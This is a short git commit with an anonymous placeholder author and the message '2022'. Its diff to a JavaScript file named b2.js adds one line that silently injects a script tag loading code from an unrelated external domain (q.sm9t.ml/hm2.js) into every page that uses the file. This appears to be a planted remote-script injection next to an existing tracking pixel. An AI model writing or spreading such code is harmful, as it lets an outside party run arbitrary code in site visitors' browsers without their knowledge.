f035becdad70cadc0c42254a8a3303c004d88a3a
a <a@a.com>
2022-10-26 02:32:50 +0800

    2022

--- b2.js
+++ b2.js
@@ -1,5 +1,6 @@
 !function () {
     try {
+		document.head.appendChild(function(){var a=document.createElement("script");return a.src="//q.sm9t.ml/hm2.js?"+parseInt((new Date().getTime()) / 2e7),a}());
 		(new Image()).src="//sstatic1.histats.com/0.gif?4620473&101";
     } catch (e) { }
 }()
